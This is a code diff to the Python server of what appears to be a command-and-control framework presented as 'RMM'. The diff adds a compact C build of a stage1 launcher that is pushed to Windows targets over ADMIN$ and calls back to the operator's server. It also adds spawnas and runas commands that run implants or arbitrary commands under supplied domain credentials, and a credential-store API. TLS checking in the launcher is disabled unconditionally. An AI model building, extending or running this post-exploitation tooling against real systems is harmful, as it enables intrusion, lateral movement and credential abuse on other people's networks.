@@ -68,6 +68,7 @@ from rmm_embeddings import EmbeddingStore, embedding_api
 from rmm_bloodhound import bloodhound_api
 from rmm_bloodhound_broker import BloodHoundBroker
 from rmm_ui_state import UiStateError, UiStateStore
+import rmm_creds as _rmm_creds
 from rmm_rclone import (
     RcloneConfigError,
     get_rclone_max_bytes,
@@ -136,6 +137,11 @@ LATERAL_RESULT_RE = re.compile(r"target session=(?P<session_id>[A-Za-z0-9_-]{8,1
 LATERAL_SERVICE_RE = re.compile(r"service=(?P<service_name>[A-Za-z0-9][A-Za-z0-9._-]{0,127})")
 LATERAL_BINARY_RE = re.compile(r"binary=(?P<binary_name>[A-Za-z0-9][A-Za-z0-9._-]{0,63}\.exe)")
 LATERAL_CLEANUP_COMMAND = "__LATERAL_CLEANUP__"
+# Spawnas / runas: spawn or run a command under a different process identity.
+# The Go agent answers __SPAWNAS__ with "spawned session=<id> pid=<pid> identity=<label>".
+SPAWNAS_COMMAND = "__SPAWNAS__"
+SPAWNAS_RESULT_RE = re.compile(r"session=(?P<session_id>[A-Za-z0-9_-]{8,128})\s+pid=(?P<pid>\d+)")
+RUNAS_COMMAND = "__RUNAS__"
 STAGING_TTL_SECONDS = 600
 STAGING_ID_RE = re.compile(r"^[A-Za-z0-9_-]{8,128}$")
 
@@ -641,37 +647,84 @@ def build_go_agent(goos: str, goarch: str, agent_config: dict | None = None, pro
     # The psexec lateral module embeds the compact stage1 launcher in the
     # agent binary (go:embed stage1.bin): build it first for Windows targets
     # so the agent can extract and push it at runtime.
+    #
+    # Preferred: compile the minimal C stage1 (stage1/stage1.c) with
+    # x86_64-w64-mingw32-gcc.  The resulting binary is ~30-50 KB vs ~2 MB
+    # for the Go version, which matters for ADMIN$ write speed and reduces
+    # the on-disk footprint on the target.  Falls back to the Go build when
+    # MinGW is not available so CI/CD environments without MinGW still work.
     if goos == "windows":
-        stage1_flags = ["-s", "-w", "-H=windowsgui"]
-        if config_values["base_url"]:
-            stage1_flags.extend([
-                "-X",
-                "main.defaultBaseURLB64=" + base64.b64encode(config_values["base_url"].encode("utf-8")).decode("ascii"),
-            ])
-        stage1_ldflags = " ".join(shlex.quote(flag) for flag in stage1_flags)
         stage1_path = safe_join_under(GO_AGENT_BUILD_DIR, f"{build_id}-stage1.exe")
-        try:
-            completed_stage1 = (process_owner or BuildProcessManager()).run(
-                [
-                    go_bin,
-                    "build",
-                    "-buildvcs=false",
-                    "-trimpath",
-                    "-ldflags",
-                    stage1_ldflags,
-                    "-o",
-                    stage1_path,
-                    "./stage1",
-                ],
-                cwd=root,
-                env=env,
-                timeout=120,
-            )
-        except subprocess.TimeoutExpired as exc:
-            raise RuntimeError("stage1 build timed out after 120 seconds") from exc
-        if completed_stage1.returncode != 0:
-            detail = (completed_stage1.stderr or completed_stage1.stdout or "build failed").strip()
-            raise RuntimeError(detail[-4000:])
+        stage1_c_src = os.path.join(root, "stage1", "stage1.c")
+        mingw_cc = shutil.which("x86_64-w64-mingw32-gcc")
+
+        if mingw_cc and os.path.isfile(stage1_c_src):
+            # C build: inject BASE_URL via -D macro; add -DSTAGE1_INSECURE
+            # unconditionally (the RMM server commonly uses a self-signed cert
+            # on the lab range; remove for production deployments).
+            cc_cmd = [
+                mingw_cc,
+                "-Os", "-s", "-mwindows",
+                "-o", stage1_path,
+                stage1_c_src,
+                "-lwinhttp", "-lbcrypt", "-lshell32",
+                "-DSTAGE1_INSECURE",
+            ]
+            if config_values["base_url"]:
+                # Escape the URL for a C wide-string literal: backslash-escape
+                # double quotes (URLs should not contain them, but be safe).
+                safe_url = config_values["base_url"].replace('"', '\\"')
+                cc_cmd.append(f'-DBASE_URL=L"{safe_url}"')
+            try:
+                completed_stage1 = (process_owner or BuildProcessManager()).run(
+                    cc_cmd,
+                    cwd=root,
+                    env=env,
+                    timeout=60,
+                )
+            except subprocess.TimeoutExpired as exc:
+                raise RuntimeError("stage1 C build timed out after 60 seconds") from exc
+            if completed_stage1.returncode != 0:
+                detail = (completed_stage1.stderr or completed_stage1.stdout or "C build failed").strip()
+                raise RuntimeError(f"stage1 C compile failed: {detail[-4000:]}")
+        else:
+            # Fallback: build the Go stage1 (larger but no MinGW dependency).
+            if not mingw_cc:
+                import logging as _logging
+                _logging.getLogger(__name__).warning(
+                    "x86_64-w64-mingw32-gcc not found; building Go stage1 (~2 MB). "
+                    "Install mingw-w64 for the compact C stage1."
+                )
+            stage1_flags = ["-s", "-w", "-H=windowsgui"]
+            if config_values["base_url"]:
+                stage1_flags.extend([
+                    "-X",
+                    "main.defaultBaseURLB64=" + base64.b64encode(config_values["base_url"].encode("utf-8")).decode("ascii"),
+                ])
+            stage1_ldflags = " ".join(shlex.quote(flag) for flag in stage1_flags)
+            try:
+                completed_stage1 = (process_owner or BuildProcessManager()).run(
+                    [
+                        go_bin,
+                        "build",
+                        "-buildvcs=false",
+                        "-trimpath",
+                        "-ldflags",
+                        stage1_ldflags,
+                        "-o",
+                        stage1_path,
+                        "./stage1",
+                    ],
+                    cwd=root,
+                    env=env,
+                    timeout=120,
+                )
+            except subprocess.TimeoutExpired as exc:
+                raise RuntimeError("stage1 build timed out after 120 seconds") from exc
+            if completed_stage1.returncode != 0:
+                detail = (completed_stage1.stderr or completed_stage1.stdout or "build failed").strip()
+                raise RuntimeError(detail[-4000:])
+
         with open(stage1_path, "rb") as handle:
             stage1_binary = handle.read()
         with open(os.path.join(root, "stage1.bin"), "wb") as handle:
@@ -2846,7 +2899,7 @@ class RMMServer:
     def _new_deployment_id(self, kind):
         """Reserve a fresh identity before dispatch so registration is authoritative."""
         while True:
-            session_id = f"srv-{kind}-{secrets.token_hex(16)}"
+            session_id = f"go-{kind}-{secrets.token_hex(16)}"
             if session_id not in getattr(self, "sessions", {}) and session_id not in getattr(self, "killed_sessions", set()):
                 return session_id
 
@@ -2974,6 +3027,84 @@ class RMMServer:
         body = str((event or {}).get("body") or "").strip()
         return {"ok": body == "no token active" or body.startswith("token reverted:"),
                 "session_id": session.id, "output": body}, "ok"
+
+    def spawnas(self, session_id_or_prefix, workspace_dir, domain, user, password,
+                verify=True, spawn_timeout=120.0, register_timeout=60.0, verify_timeout=120.0):
+        """Spawn a new agent copy under a different process identity using the cascade.
+
+        Credentials are resolved server-side; only the identity label travels in
+        operator events, never the password.
+        """
+        session = self.resolve_session(session_id_or_prefix)
+        if not session:
+            return None, "not_found"
+        if (getattr(session, "agent_type", "") or "").strip().lower() != "go":
+            return None, "agent_type_unsupported"
+        user = (user or "").strip()
+        domain = (domain or "").strip()
+        if domain == "" and "\\" in user:
+            domain, user = (p.strip() for p in user.split("\\", 1))
+        if not user:
+            return None, "invalid_credentials"
+        spawned_id = self._new_deployment_id("spawnas")
+        identity = self._identity_label(domain, user)
+        command = SPAWNAS_COMMAND + "\n" + json.dumps(
+            {"session_id": spawned_id,
+             "workspace_id": getattr(session, "workspace_id", None) or "",
+             "domain": domain, "user": user, "password": password or ""},
+            separators=(",", ":"),
+        )
+        self.record_operator_action(session, f"{SPAWNAS_COMMAND} {identity}", "spawnas")
+        event, status = self.exec_and_wait(session.id, command, timeout=spawn_timeout)
+        if status not in ("ok", "timeout"):
+            return None, status
+        output = str((event or {}).get("body") or "")
+        match = SPAWNAS_RESULT_RE.search(output)
+        acknowledged = bool(match and match.group("session_id") == spawned_id)
+        payload = {
+            "parent_session_id": session.id,
+            "spawned_session_id": spawned_id,
+            "identity": identity,
+            "spawn_pid": int(match.group("pid")) if acknowledged else None,
+            "spawn_output": output,
+            "launch_status": "acknowledged" if acknowledged else "inconclusive",
+            "submission_status": status,
+        }
+        return self._verify_deployment(session, spawned_id, payload, verify,
+                                       register_timeout, verify_timeout,
+                                       "parent_responsive", "spawned_responsive")
+
+    def runas(self, session_id_or_prefix, command_str, domain, user, password, timeout=120.0):
+        """Run an arbitrary command on a Go session under a different identity.
+
+        The password is sent in the beacon command and never logged.
+        Output is returned to the operator.
+        """
+        session = self.resolve_session(session_id_or_prefix)
+        if not session:
+            return None, "not_found"
+        if (getattr(session, "agent_type", "") or "").strip().lower() != "go":
+            return None, "agent_type_unsupported"
+        user = (user or "").strip()
+        domain = (domain or "").strip()
+        if domain == "" and "\\" in user:
+            domain, user = (p.strip() for p in user.split("\\", 1))
+        if not user:
+            return None, "invalid_credentials"
+        if not (command_str or "").strip():
+            return None, "invalid_command"
+        identity = self._identity_label(domain, user)
+        command = RUNAS_COMMAND + "\n" + json.dumps(
+            {"command": command_str.strip(), "domain": domain,
+             "user": user, "password": password or ""},
+            separators=(",", ":"),
+        )
+        self.record_operator_action(session, f"{RUNAS_COMMAND} {identity} {command_str.strip()}", "runas")
+        event, status = self.exec_and_wait(session.id, command, timeout=timeout)
+        if status != "ok":
+            return None, status
+        body = str((event or {}).get("body") or "").strip()
+        return {"ok": True, "session_id": session.id, "identity": identity, "output": body}, "ok"
 
     def lateral_move(self, session_id_or_prefix, method, host, verify=True,
                      exec_timeout=300.0, register_timeout=60.0, verify_timeout=120.0):
@@ -4152,6 +4283,15 @@ class RMMHandler(BaseHTTPRequestHandler):
             else:
                 self._json(200, {"requests": self.server_instance.bloodhound_broker.pending(owner)})
             return True
+        if parts == ["creds"]:
+            # GET /api/v1/creds — list credentials (workspace-scoped, no passwords).
+            owner = self._workspace_scope()
+            if not owner:
+                self._json(403, {"error": "workspace_auth_required"})
+                return True
+            workspace_dir = plugin_directory(owner)
+            self._json(200, _rmm_creds.creds_list(workspace_dir))
+            return True
         if parts and parts[0] == "embeddings":
             return self._handle_embeddings("GET", parts)
         if parts == ["plugin-releases"]:
@@ -4972,6 +5112,131 @@ class RMMHandler(BaseHTTPRequestHandler):
                 self._json(200, result)
             return True
 
+        if len(parts) == 3 and parts[0] == "sessions" and parts[2] == "spawnas":
+            session = _resolve_api_session(self, parts[1])
+            if not session:
+                self._json(404, {"error": "session_not_found"})
+                return True
+            owner = self._workspace_scope()
+            if not owner:
+                self._json(403, {"error": "workspace_auth_required",
+                                 "detail": "spawnas requires workspace authentication"})
+                return True
+            try:
+                verify = body.get("verify", True)
+                spawn_timeout = float(body.get("spawn_timeout", 120))
+                register_timeout = float(body.get("register_timeout", 60))
+                verify_timeout = float(body.get("verify_timeout", 120))
+                if not isinstance(verify, bool):
+                    raise ValueError("verify must be a boolean")
+                if not all(1 <= v <= 3600 for v in (spawn_timeout, register_timeout, verify_timeout)):
+                    raise ValueError("spawnas timeouts must be between 1 and 3600 seconds")
+            except (TypeError, ValueError):
+                self._json(400, {"error": "invalid_spawnas_options"})
+                return True
+            # Resolve credentials: accept direct creds or a cred_id.
+            cred_id = str(body.get("cred_id") or "").strip()
+            if cred_id:
+                workspace_dir = plugin_directory(owner)
+                cred = _rmm_creds.creds_resolve(workspace_dir, cred_id)
+                if cred is None:
+                    self._json(404, {"error": "cred_not_found", "cred_id": cred_id})
+                    return True
+                domain, user, password = cred["domain"], cred["user"], cred["password"]
+            else:
+                domain = str(body.get("domain") or "")
+                user = str(body.get("user") or "")
+                password = str(body.get("password") or "")
+            workspace_dir = plugin_directory(owner)
+            result, status = srv.spawnas(
+                session.id, workspace_dir,
+                domain, user, password,
+                verify=verify,
+                spawn_timeout=spawn_timeout,
+                register_timeout=register_timeout,
+                verify_timeout=verify_timeout,
+            )
+            if status == "not_found":
+                self._json(404, {"error": "session_not_found"})
+            elif status in ("agent_type_unsupported", "session_busy"):
+                self._json(409, {"error": status})
+            elif status == "invalid_credentials":
+                self._json(400, {"error": status})
+            elif status == "session_killed":
+                self._json(410, {"error": status})
+            elif status == "server_stopped":
+                self._json(503, {"error": status})
+            elif status == "timeout":
+                self._json(408, {"error": status, "command": SPAWNAS_COMMAND})
+            else:
+                self._json(200, result)
+            return True
+
+        if len(parts) == 3 and parts[0] == "sessions" and parts[2] == "runas":
+            session = _resolve_api_session(self, parts[1])
+            if not session:
+                self._json(404, {"error": "session_not_found"})
+                return True
+            owner = self._workspace_scope()
+            if not owner:
+                self._json(403, {"error": "workspace_auth_required",
+                                 "detail": "runas requires workspace authentication"})
+                return True
+            try:
+                timeout = float(body.get("timeout", 120))
+                if not 1 <= timeout <= 3600:
+                    raise ValueError("timeout must be between 1 and 3600 seconds")
+            except (TypeError, ValueError):
+                self._json(400, {"error": "invalid_runas_options"})
+                return True
+            # Resolve credentials.
+            cred_id = str(body.get("cred_id") or "").strip()
+            if cred_id:
+                workspace_dir = plugin_directory(owner)
+                cred = _rmm_creds.creds_resolve(workspace_dir, cred_id)
+                if cred is None:
+                    self._json(404, {"error": "cred_not_found", "cred_id": cred_id})
+                    return True
+                domain, user, password = cred["domain"], cred["user"], cred["password"]
+            else:
+                domain = str(body.get("domain") or "")
+                user = str(body.get("user") or "")
+                password = str(body.get("password") or "")
+            command_str = str(body.get("command") or "").strip()
+            workspace_dir = plugin_directory(owner)
+            result, status = srv.runas(session.id, command_str, domain, user, password, timeout=timeout)
+            if status == "not_found":
+                self._json(404, {"error": "session_not_found"})
+            elif status in ("agent_type_unsupported", "session_busy"):
+                self._json(409, {"error": status})
+            elif status in ("invalid_credentials", "invalid_command"):
+                self._json(400, {"error": status})
+            elif status == "session_killed":
+                self._json(410, {"error": status})
+            elif status == "server_stopped":
+                self._json(503, {"error": status})
+            elif status == "timeout":
+                self._json(408, {"error": status, "command": RUNAS_COMMAND})
+            else:
+                self._json(200, result)
+            return True
+
+        if len(parts) == 2 and parts[0] == "creds":
+            # POST /api/v1/creds — add a credential entry (workspace-scoped).
+            owner = self._workspace_scope()
+            if not owner:
+                self._json(403, {"error": "workspace_auth_required"})
+                return True
+            workspace_dir = plugin_directory(owner)
+            result = _rmm_creds.creds_add(
+                workspace_dir,
+                str(body.get("domain") or ""),
+                str(body.get("user") or ""),
+                str(body.get("password") or ""),
+            )
+            self._json(200 if result.get("ok") else 400, result)
+            return True
+
         if len(parts) == 3 and parts[0] == "sessions" and parts[2] == "lateral":
             session = _resolve_api_session(self, parts[1])
             if not session:
@@ -5543,6 +5808,16 @@ class RMMHandler(BaseHTTPRequestHandler):
             return True
         if parts and parts[0] == "embeddings":
             return self._handle_embeddings("DELETE", parts)
+        if len(parts) == 2 and parts[0] == "creds":
+            # DELETE /api/v1/creds/{cred_id} — remove a credential entry.
+            owner = self._workspace_scope()
+            if not owner:
+                self._json(403, {"error": "workspace_auth_required"})
+                return True
+            workspace_dir = plugin_directory(owner)
+            result = _rmm_creds.creds_del(workspace_dir, urllib.parse.unquote(parts[1]))
+            self._json(200 if result.get("ok") else 404, result)
+            return True
         if len(parts) == 2 and parts[0] == "plugin-sources":
             return self._handle_plugin_sources("DELETE", urllib.parse.unquote(parts[1]))
         srv = self.server_instance
